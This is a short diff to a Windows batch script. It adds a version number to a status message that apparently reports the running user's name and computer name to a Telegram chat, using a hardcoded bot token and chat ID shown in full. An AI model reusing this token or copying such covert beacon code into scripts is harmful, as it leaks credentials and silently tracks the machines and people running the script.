@@ -6,9 +6,12 @@
 
 @echo off
 
-
-
 setlocal enabledelayedexpansion
+
+
+set "BATCHVERSION=4.7"
+
+
 
 set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 set "filename="
@@ -1228,7 +1231,7 @@ echo.
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|RUNNING.....|%time%"
+set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|RUNNING(V%BATCHVERSION%).....|%time%"
 
 
 :: URL encode the message by replacing spaces with %20
